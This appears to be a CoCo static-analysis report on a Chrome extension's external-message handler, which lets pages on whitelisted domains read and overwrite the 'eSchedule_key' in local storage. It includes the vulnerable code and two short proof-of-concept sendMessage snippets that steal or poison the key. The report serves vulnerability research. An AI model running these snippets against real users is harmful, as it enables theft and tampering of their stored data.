# CoCo Analysis: mojcdbghngocaepbnibohmonnhikdbai

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2

---

## Sink 1: storage_local_get_source → sendResponseExternal_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/mojcdbghngocaepbnibohmonnhikdbai/opgen_generated_files/bg.js
Line 751: var storage_local_get_source = {'key': 'value'};
Line 972: console.log("getting key " + result.eSchedule_key);

**Code:**

```javascript
// Background script - Entry point (bg.js)
chrome.runtime.onMessageExternal.addListener(
  function(request, sender, sendResponse) { // ← attacker can send external message
    if (request) {
      if (request.message) {
        if (request.message == "get") {
          chrome.storage.local.get("eSchedule_key",
            function(result){
              console.log("getting key " + result.eSchedule_key);
              sendResponse({version: 1.0, eSchedule_key: result.eSchedule_key}); // ← leaks storage data to attacker
            });
        }
        else if(request.message == "set"){
          chrome.storage.local.set({"eSchedule_key": request.set_key}, function(result){
            console.log("Key stored: " + request.set_key);
          });
          sendResponse({version: 1.0, eSchedule_key: request.set_key});
        }
      }
    }
    return true;
  });
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message from whitelisted domains (*.myesched.com, *.emseschedule.com)

**Attack:**

```javascript
// From any webpage on *.myesched.com or *.emseschedule.com
chrome.runtime.sendMessage(
  "mojcdbghngocaepbnibohmonnhikdbai",  // extension ID
  {message: "get"},
  function(response) {
    console.log("Stolen key:", response.eSchedule_key); // ← attacker receives storage data
  }
);
```

**Impact:** Information disclosure. An attacker who controls or compromises any page on the whitelisted domains (*.myesched.com, *.emseschedule.com) can read the `eSchedule_key` from the extension's local storage by sending an external message. This represents a complete storage exploitation chain: storage.get → sendResponse to attacker.

---

## Sink 2: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/mojcdbghngocaepbnibohmonnhikdbai/opgen_generated_files/bg.js
Line 978: chrome.storage.local.set({"eSchedule_key": request.set_key}, function(result){

**Code:**

```javascript
// Background script - Entry point (bg.js)
chrome.runtime.onMessageExternal.addListener(
  function(request, sender, sendResponse) { // ← attacker can send external message
    if (request) {
      if (request.message) {
        if (request.message == "get") {
          chrome.storage.local.get("eSchedule_key",
            function(result){
              console.log("getting key " + result.eSchedule_key);
              sendResponse({version: 1.0, eSchedule_key: result.eSchedule_key});
            });
        }
        else if(request.message == "set"){
          chrome.storage.local.set({"eSchedule_key": request.set_key}, function(result){ // ← attacker-controlled data
            console.log("Key stored: " + request.set_key);
          });
          sendResponse({version: 1.0, eSchedule_key: request.set_key});
        }
      }
    }
    return true;
  });
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message from whitelisted domains (*.myesched.com, *.emseschedule.com)

**Attack:**

```javascript
// From any webpage on *.myesched.com or *.emseschedule.com
chrome.runtime.sendMessage(
  "mojcdbghngocaepbnibohmonnhikdbai",  // extension ID
  {message: "set", set_key: "attacker_controlled_value"},
  function(response) {
    console.log("Key stored:", response.eSchedule_key);
  }
);
```

**Impact:** Storage poisoning with retrieval capability. An attacker on the whitelisted domains can write arbitrary data to the `eSchedule_key` in local storage. Combined with Sink 1, this creates a complete read/write storage exploitation chain where the attacker can both poison storage and retrieve the poisoned data.

---

## Overall Analysis

Both sinks represent TRUE POSITIVE vulnerabilities forming a complete storage exploitation chain. The extension uses `chrome.runtime.onMessageExternal` to accept messages from whitelisted domains (*.myesched.com, *.emseschedule.com). An attacker who controls or compromises any page on these domains can:

1. **Read sensitive data**: Use the "get" message to retrieve the `eSchedule_key` from storage via sendResponse
2. **Write malicious data**: Use the "set" message to poison the `eSchedule_key` in storage with arbitrary values

This violates the threat model because:
- External messages are accessible from any page on the whitelisted domains (XSS, subdomain takeover, or legitimate attacker-controlled pages)
- The stored data flows back to the attacker via sendResponse (complete exploitation chain)
- No validation or sanitization of the attacker-controlled input

The extension has the required "storage" permission in manifest.json, making both attacks fully exploitable.
